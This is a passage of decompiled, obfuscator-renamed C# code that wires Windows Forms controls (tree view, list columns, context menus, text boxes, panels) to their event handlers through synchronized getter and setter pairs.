		{
			this.\u000F\u2001 = \u0002;
		}

		// Token: 0x0600026F RID: 623 RVA: 0x0001F790 File Offset: 0x0001D990
		internal virtual ColumnHeader bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2000()
		{
			return this.\u0002\u2002;
		}

		// Token: 0x06000270 RID: 624 RVA: 0x0001F7A4 File Offset: 0x0001D9A4
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2000(ColumnHeader \u0002)
		{
			this.\u0002\u2002 = \u0002;
		}

		// Token: 0x06000271 RID: 625 RVA: 0x0001F7B0 File Offset: 0x0001D9B0
		internal virtual ColumnHeader bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2000()
		{
			return this.\u0003\u2002;
		}

		// Token: 0x06000272 RID: 626 RVA: 0x0001F7C4 File Offset: 0x0001D9C4
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2000(ColumnHeader \u0002)
		{
			this.\u0003\u2002 = \u0002;
		}

		// Token: 0x06000273 RID: 627 RVA: 0x0001F7D0 File Offset: 0x0001D9D0
		internal virtual ContextMenuStrip bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003()
		{
			return this.\u0005\u2002;
		}

		// Token: 0x06000274 RID: 628 RVA: 0x0001F7E4 File Offset: 0x0001D9E4
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003(ContextMenuStrip \u0002)
		{
			this.\u0005\u2002 = \u0002;
		}

		// Token: 0x06000275 RID: 629 RVA: 0x0001F7F0 File Offset: 0x0001D9F0
		internal virtual ToolStripMenuItem bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008()
		{
			return this.\u0008\u2002;
		}

		// Token: 0x06000276 RID: 630 RVA: 0x0001F804 File Offset: 0x0001DA04
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0002\u2000);
			if (this.\u0008\u2002 != null)
			{
				this.\u0008\u2002.Click -= value;
			}
			this.\u0008\u2002 = \u0002;
			if (this.\u0008\u2002 != null)
			{
				this.\u0008\u2002.Click += value;
			}
		}

		// Token: 0x06000277 RID: 631 RVA: 0x0001F854 File Offset: 0x0001DA54
		internal virtual Panel bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0006\u2002;
		}

		// Token: 0x06000278 RID: 632 RVA: 0x0001F868 File Offset: 0x0001DA68
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(Panel \u0002)
		{
			this.\u0006\u2002 = \u0002;
		}

		// Token: 0x06000279 RID: 633 RVA: 0x0001F874 File Offset: 0x0001DA74
		internal virtual ColumnHeader bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2000()
		{
			return this.\u000E\u2002;
		}

		// Token: 0x0600027A RID: 634 RVA: 0x0001F888 File Offset: 0x0001DA88
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2000(ColumnHeader \u0002)
		{
			this.\u000E\u2002 = \u0002;
		}

		// Token: 0x0600027B RID: 635 RVA: 0x0001F894 File Offset: 0x0001DA94
		internal virtual ColumnHeader bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2000()
		{
			return this.\u000F\u2002;
		}

		// Token: 0x0600027C RID: 636 RVA: 0x0001F8A8 File Offset: 0x0001DAA8
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2000(ColumnHeader \u0002)
		{
			this.\u000F\u2002 = \u0002;
		}

		// Token: 0x0600027D RID: 637 RVA: 0x0001F8B4 File Offset: 0x0001DAB4
		internal virtual ColumnHeader bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2000()
		{
			return this.\u0002\u2003;
		}

		// Token: 0x0600027E RID: 638 RVA: 0x0001F8C8 File Offset: 0x0001DAC8
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2000(ColumnHeader \u0002)
		{
			this.\u0002\u2003 = \u0002;
		}

		// Token: 0x0600027F RID: 639 RVA: 0x0001F8D4 File Offset: 0x0001DAD4
		internal virtual TreeView bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0003\u2003;
		}

		// Token: 0x06000280 RID: 640 RVA: 0x0001F8E8 File Offset: 0x0001DAE8
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(TreeView \u0002)
		{
			TreeNodeMouseClickEventHandler value = new TreeNodeMouseClickEventHandler(this.\u0002);
			TreeViewEventHandler value2 = new TreeViewEventHandler(this.\u0002);
			TreeViewEventHandler value3 = new TreeViewEventHandler(this.\u0003);
			EventHandler value4 = new EventHandler(this.\u0008\u2001);
			TreeViewEventHandler value5 = new TreeViewEventHandler(this.\u0005);
			if (this.\u0003\u2003 != null)
			{
				this.\u0003\u2003.NodeMouseClick -= value;
				this.\u0003\u2003.AfterCollapse -= value2;
				this.\u0003\u2003.AfterExpand -= value3;
				this.\u0003\u2003.DoubleClick -= value4;
				this.\u0003\u2003.AfterSelect -= value5;
			}
			this.\u0003\u2003 = \u0002;
			if (this.\u0003\u2003 != null)
			{
				this.\u0003\u2003.NodeMouseClick += value;
				this.\u0003\u2003.AfterCollapse += value2;
				this.\u0003\u2003.AfterExpand += value3;
				this.\u0003\u2003.DoubleClick += value4;
				this.\u0003\u2003.AfterSelect += value5;
			}
		}

		// Token: 0x06000281 RID: 641 RVA: 0x0001F9D4 File Offset: 0x0001DBD4
		internal virtual ContextMenuStrip bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005()
		{
			return this.\u0005\u2003;
		}

		// Token: 0x06000282 RID: 642 RVA: 0x0001F9E8 File Offset: 0x0001DBE8
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005(ContextMenuStrip \u0002)
		{
			this.\u0005\u2003 = \u0002;
		}

		// Token: 0x06000283 RID: 643 RVA: 0x0001F9F4 File Offset: 0x0001DBF4
		internal virtual ToolStripMenuItem bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006()
		{
			return this.\u0008\u2003;
		}

		// Token: 0x06000284 RID: 644 RVA: 0x0001FA08 File Offset: 0x0001DC08
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0006\u2000);
			if (this.\u0008\u2003 != null)
			{
				this.\u0008\u2003.Click -= value;
			}
			this.\u0008\u2003 = \u0002;
			if (this.\u0008\u2003 != null)
			{
				this.\u0008\u2003.Click += value;
			}
		}

		// Token: 0x06000285 RID: 645 RVA: 0x0001FA58 File Offset: 0x0001DC58
		internal virtual ToolStripMenuItem bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E()
		{
			return this.\u0006\u2003;
		}

		// Token: 0x06000286 RID: 646 RVA: 0x0001FA6C File Offset: 0x0001DC6C
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u000E\u2000);
			if (this.\u0006\u2003 != null)
			{
				this.\u0006\u2003.Click -= value;
			}
			this.\u0006\u2003 = \u0002;
			if (this.\u0006\u2003 != null)
			{
				this.\u0006\u2003.Click += value;
			}
		}

		// Token: 0x06000287 RID: 647 RVA: 0x0001FABC File Offset: 0x0001DCBC
		internal virtual ToolStripMenuItem bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F()
		{
			return this.\u000E\u2003;
		}

		// Token: 0x06000288 RID: 648 RVA: 0x0001FAD0 File Offset: 0x0001DCD0
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0002\u2001);
			if (this.\u000E\u2003 != null)
			{
				this.\u000E\u2003.Click -= value;
			}
			this.\u000E\u2003 = \u0002;
			if (this.\u000E\u2003 != null)
			{
				this.\u000E\u2003.Click += value;
			}
		}

		// Token: 0x06000289 RID: 649 RVA: 0x0001FB20 File Offset: 0x0001DD20
		internal virtual ToolStripMenuItem bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2000()
		{
			return this.\u000F\u2003;
		}

		// Token: 0x0600028A RID: 650 RVA: 0x0001FB34 File Offset: 0x0001DD34
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2000(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0003\u2001);
			if (this.\u000F\u2003 != null)
			{
				this.\u000F\u2003.Click -= value;
			}
			this.\u000F\u2003 = \u0002;
			if (this.\u000F\u2003 != null)
			{
				this.\u000F\u2003.Click += value;
			}
		}

		// Token: 0x0600028B RID: 651 RVA: 0x0001FB84 File Offset: 0x0001DD84
		internal virtual ImageList bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0002\u2004;
		}

		// Token: 0x0600028C RID: 652 RVA: 0x0001FB98 File Offset: 0x0001DD98
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(ImageList \u0002)
		{
			this.\u0002\u2004 = \u0002;
		}

		// Token: 0x0600028D RID: 653 RVA: 0x0001FBA4 File Offset: 0x0001DDA4
		internal virtual ContextMenuStrip bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008()
		{
			return this.\u0003\u2004;
		}

		// Token: 0x0600028E RID: 654 RVA: 0x0001FBB8 File Offset: 0x0001DDB8
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008(ContextMenuStrip \u0002)
		{
			this.\u0003\u2004 = \u0002;
		}

		// Token: 0x0600028F RID: 655 RVA: 0x0001FBC4 File Offset: 0x0001DDC4
		internal virtual ToolStripMenuItem bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2000()
		{
			return this.\u0005\u2004;
		}

		// Token: 0x06000290 RID: 656 RVA: 0x0001FBD8 File Offset: 0x0001DDD8
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2000(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0003\u2000);
			if (this.\u0005\u2004 != null)
			{
				this.\u0005\u2004.Click -= value;
			}
			this.\u0005\u2004 = \u0002;
			if (this.\u0005\u2004 != null)
			{
				this.\u0005\u2004.Click += value;
			}
		}

		// Token: 0x06000291 RID: 657 RVA: 0x0001FC28 File Offset: 0x0001DE28
		internal virtual ToolStripMenuItem bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2000()
		{
			return this.\u0008\u2004;
		}

		// Token: 0x06000292 RID: 658 RVA: 0x0001FC3C File Offset: 0x0001DE3C
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2000(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0005\u2000);
			if (this.\u0008\u2004 != null)
			{
				this.\u0008\u2004.Click -= value;
			}
			this.\u0008\u2004 = \u0002;
			if (this.\u0008\u2004 != null)
			{
				this.\u0008\u2004.Click += value;
			}
		}

		// Token: 0x06000293 RID: 659 RVA: 0x0001FC8C File Offset: 0x0001DE8C
		internal virtual ToolStripMenuItem bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2000()
		{
			return this.\u0006\u2004;
		}

		// Token: 0x06000294 RID: 660 RVA: 0x0001FCA0 File Offset: 0x0001DEA0
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2000(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0008\u2000);
			if (this.\u0006\u2004 != null)
			{
				this.\u0006\u2004.Click -= value;
			}
			this.\u0006\u2004 = \u0002;
			if (this.\u0006\u2004 != null)
			{
				this.\u0006\u2004.Click += value;
			}
		}

		// Token: 0x06000295 RID: 661 RVA: 0x0001FCF0 File Offset: 0x0001DEF0
		internal virtual Panel bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003()
		{
			return this.\u000E\u2004;
		}

		// Token: 0x06000296 RID: 662 RVA: 0x0001FD04 File Offset: 0x0001DF04
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003(Panel \u0002)
		{
			EventHandler value = new EventHandler(this.\u0005\u2001);
			if (this.\u000E\u2004 != null)
			{
				this.\u000E\u2004.Resize -= value;
			}
			this.\u000E\u2004 = \u0002;
			if (this.\u000E\u2004 != null)
			{
				this.\u000E\u2004.Resize += value;
			}
		}

		// Token: 0x06000297 RID: 663 RVA: 0x0001FD54 File Offset: 0x0001DF54
		internal virtual RichTextBox bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u000F\u2004;
		}

		// Token: 0x06000298 RID: 664 RVA: 0x0001FD68 File Offset: 0x0001DF68
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(RichTextBox \u0002)
		{
			this.\u000F\u2004 = \u0002;
		}

		// Token: 0x06000299 RID: 665 RVA: 0x0001FD74 File Offset: 0x0001DF74
		internal virtual TextBox bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u0002\u2005;
		}

		// Token: 0x0600029A RID: 666 RVA: 0x0001FD88 File Offset: 0x0001DF88
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(TextBox \u0002)
		{
			KeyEventHandler value = new KeyEventHandler(this.\u0002);
			if (this.\u0002\u2005 != null)
			{
				this.\u0002\u2005.KeyDown -= value;
			}
			this.\u0002\u2005 = \u0002;
			if (this.\u0002\u2005 != null)
			{
				this.\u0002\u2005.KeyDown += value;
			}
		}

		// Token: 0x0600029B RID: 667 RVA: 0x0001FDD8 File Offset: 0x0001DFD8
		internal virtual Panel bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005()
		{
			return this.\u0003\u2005;
		}

		// Token: 0x0600029C RID: 668 RVA: 0x0001FDEC File Offset: 0x0001DFEC
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005(Panel \u0002)
		{
			EventHandler value = new EventHandler(this.\u0006\u2004);
			if (this.\u0003\u2005 != null)
			{
				this.\u0003\u2005.Resize -= value;
			}
			this.\u0003\u2005 = \u0002;
			if (this.\u0003\u2005 != null)
			{
				this.\u0003\u2005.Resize += value;
			}
		}

		// Token: 0x0600029D RID: 669 RVA: 0x0001FE3C File Offset: 0x0001E03C
		internal virtual \u000F\u2000 bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005()
		{
			return this.\u0005\u2005;
		}

		// Token: 0x0600029E RID: 670 RVA: 0x0001FE50 File Offset: 0x0001E050
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005(\u000F\u2000 \u0002)
		{
			EventHandler value = new EventHandler(this.\u0002\u2002);
			EventHandler value2 = new EventHandler(this.\u000F\u2001);
			if (this.\u0005\u2005 != null)
			{
				this.\u0005\u2005.SelectedIndexChanged -= value;
				this.\u0005\u2005.DoubleClick -= value2;
			}
			this.\u0005\u2005 = \u0002;
			if (this.\u0005\u2005 != null)
			{
				this.\u0005\u2005.SelectedIndexChanged += value;
				this.\u0005\u2005.DoubleClick += value2;
			}
		}

		// Token: 0x0600029F RID: 671 RVA: 0x0001FEC8 File Offset: 0x0001E0C8
		internal virtual ColumnHeader bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2001()
		{
			return this.\u0008\u2005;
		}

		// Token: 0x060002A0 RID: 672 RVA: 0x0001FEDC File Offset: 0x0001E0DC
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2001(ColumnHeader \u0002)
		{
			this.\u0008\u2005 = \u0002;
		}

		// Token: 0x060002A1 RID: 673 RVA: 0x0001FEE8 File Offset: 0x0001E0E8
		internal virtual ColumnHeader bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2001()
		{
			return this.\u0006\u2005;
		}

		// Token: 0x060002A2 RID: 674 RVA: 0x0001FEFC File Offset: 0x0001E0FC
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2001(ColumnHeader \u0002)
		{
			this.\u0006\u2005 = \u0002;
		}

		// Token: 0x060002A3 RID: 675 RVA: 0x0001FF08 File Offset: 0x0001E108
		internal virtual ColumnHeader bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2001()
		{
			return this.\u000E\u2005;
		}

		// Token: 0x060002A4 RID: 676 RVA: 0x0001FF1C File Offset: 0x0001E11C
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2001(ColumnHeader \u0002)
		{
			this.\u000E\u2005 = \u0002;
		}

		// Token: 0x060002A5 RID: 677 RVA: 0x0001FF28 File Offset: 0x0001E128
		internal virtual PictureBox bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002()
		{
			return this.\u000F\u2005;
		}

		// Token: 0x060002A6 RID: 678 RVA: 0x0001FF3C File Offset: 0x0001E13C
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(PictureBox \u0002)
		{
			this.\u000F\u2005 = \u0002;
		}

		// Token: 0x060002A7 RID: 679 RVA: 0x0001FF48 File Offset: 0x0001E148
		internal virtual TextBox bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003()
		{
			return this.\u0002\u2006;
		}

		// Token: 0x060002A8 RID: 680 RVA: 0x0001FF5C File Offset: 0x0001E15C
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003(TextBox \u0002)
		{
			this.\u0002\u2006 = \u0002;
		}

		// Token: 0x060002A9 RID: 681 RVA: 0x0001FF68 File Offset: 0x0001E168
		internal virtual \u000F\u2000 bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008()
		{
			return this.\u0003\u2006;
		}

		// Token: 0x060002AA RID: 682 RVA: 0x0001FF7C File Offset: 0x0001E17C
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008(\u000F\u2000 \u0002)
		{
			EventHandler value = new EventHandler(this.\u0006\u2004);
			EventHandler value2 = new EventHandler(this.\u000E\u2001);
			if (this.\u0003\u2006 != null)
			{
				this.\u0003\u2006.Resize -= value;
				this.\u0003\u2006.DoubleClick -= value2;
			}
			this.\u0003\u2006 = \u0002;
			if (this.\u0003\u2006 != null)
			{
				this.\u0003\u2006.Resize += value;
				this.\u0003\u2006.DoubleClick += value2;
			}
		}

		// Token: 0x060002AB RID: 683 RVA: 0x0001FFF4 File Offset: 0x0001E1F4
		internal virtual ColumnHeader bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2001()
		{
			return this.\u0005\u2006;
		}

		// Token: 0x060002AC RID: 684 RVA: 0x00020008 File Offset: 0x0001E208
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2001(ColumnHeader \u0002)
		{
			this.\u0005\u2006 = \u0002;
		}

		// Token: 0x060002AD RID: 685 RVA: 0x00020014 File Offset: 0x0001E214
		internal virtual ColumnHeader bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2001()
		{
			return this.\u0008\u2006;
		}

		// Token: 0x060002AE RID: 686 RVA: 0x00020028 File Offset: 0x0001E228
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2001(ColumnHeader \u0002)
		{
			this.\u0008\u2006 = \u0002;
		}

		// Token: 0x060002AF RID: 687 RVA: 0x00020034 File Offset: 0x0001E234
		internal virtual ContextMenuStrip bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006()
		{
			return this.\u0006\u2006;
		}

		// Token: 0x060002B0 RID: 688 RVA: 0x00020048 File Offset: 0x0001E248
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006(ContextMenuStrip \u0002)
		{
			this.\u0006\u2006 = \u0002;
		}

		// Token: 0x060002B1 RID: 689 RVA: 0x00020054 File Offset: 0x0001E254
		internal virtual ToolStripMenuItem bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2000()
		{
			return this.\u000E\u2006;
		}

		// Token: 0x060002B2 RID: 690 RVA: 0x00020068 File Offset: 0x0001E268
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2000(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0006\u2001);
			if (this.\u000E\u2006 != null)
			{
				this.\u000E\u2006.Click -= value;
			}
			this.\u000E\u2006 = \u0002;
			if (this.\u000E\u2006 != null)
			{
				this.\u000E\u2006.Click += value;
			}
		}

		// Token: 0x060002B3 RID: 691 RVA: 0x000200B8 File Offset: 0x0001E2B8
		internal virtual ImageList bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003()
		{
			return this.\u000F\u2006;
		}

		// Token: 0x060002B4 RID: 692 RVA: 0x000200CC File Offset: 0x0001E2CC
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003(ImageList \u0002)
		{
			this.\u000F\u2006 = \u0002;
		}

		// Token: 0x060002B5 RID: 693 RVA: 0x000200D8 File Offset: 0x0001E2D8
		internal virtual ContextMenuStrip bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E()
		{
			return this.\u0002\u2007;
		}

		// Token: 0x060002B6 RID: 694 RVA: 0x000200EC File Offset: 0x0001E2EC
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E(ContextMenuStrip \u0002)
		{
			this.\u0002\u2007 = \u0002;
		}

		// Token: 0x060002B7 RID: 695 RVA: 0x000200F8 File Offset: 0x0001E2F8
		internal virtual ToolStripMenuItem bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2000()
		{
			return this.\u0003\u2007;
		}

		// Token: 0x060002B8 RID: 696 RVA: 0x0002010C File Offset: 0x0001E30C
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2000(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0003\u2002);
			if (this.\u0003\u2007 != null)
			{
				this.\u0003\u2007.Click -= value;
			}
			this.\u0003\u2007 = \u0002;
			if (this.\u0003\u2007 != null)
			{
				this.\u0003\u2007.Click += value;
			}
		}

		// Token: 0x060002B9 RID: 697 RVA: 0x0002015C File Offset: 0x0001E35C
		internal virtual ToolStripMenuItem bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2000()
		{
			return this.\u0005\u2007;
		}

		// Token: 0x060002BA RID: 698 RVA: 0x00020170 File Offset: 0x0001E370
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2000(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0005\u2002);
			if (this.\u0005\u2007 != null)
			{
				this.\u0005\u2007.Click -= value;
			}
			this.\u0005\u2007 = \u0002;
			if (this.\u0005\u2007 != null)
			{
				this.\u0005\u2007.Click += value;
			}
		}

		// Token: 0x060002BB RID: 699 RVA: 0x000201C0 File Offset: 0x0001E3C0
		internal virtual ToolStripMenuItem bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2001()
		{
			return this.\u0008\u2007;
		}

		// Token: 0x060002BC RID: 700 RVA: 0x000201D4 File Offset: 0x0001E3D4
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2001(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0008\u2002);
			if (this.\u0008\u2007 != null)
			{
				this.\u0008\u2007.Click -= value;
			}
			this.\u0008\u2007 = \u0002;
			if (this.\u0008\u2007 != null)
			{
				this.\u0008\u2007.Click += value;
			}
		}

		// Token: 0x060002BD RID: 701 RVA: 0x00020224 File Offset: 0x0001E424
		internal virtual ToolStripMenuItem bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2001()
		{
			return this.\u0006\u2007;
		}

		// Token: 0x060002BE RID: 702 RVA: 0x00020238 File Offset: 0x0001E438
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2001(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0006\u2002);
			if (this.\u0006\u2007 != null)
			{
				this.\u0006\u2007.Click -= value;
			}
			this.\u0006\u2007 = \u0002;
			if (this.\u0006\u2007 != null)
			{
				this.\u0006\u2007.Click += value;
			}
		}

		// Token: 0x060002BF RID: 703 RVA: 0x00020288 File Offset: 0x0001E488
		internal virtual ToolStripMenuItem bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2001()
		{
			return this.\u000E\u2007;
		}

		// Token: 0x060002C0 RID: 704 RVA: 0x0002029C File Offset: 0x0001E49C
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2001(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u000E\u2002);
			if (this.\u000E\u2007 != null)
			{
				this.\u000E\u2007.Click -= value;
			}
			this.\u000E\u2007 = \u0002;
			if (this.\u000E\u2007 != null)
			{
				this.\u000E\u2007.Click += value;
			}
		}

		// Token: 0x060002C1 RID: 705 RVA: 0x000202EC File Offset: 0x0001E4EC
		internal virtual ToolStripMenuItem bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2001()
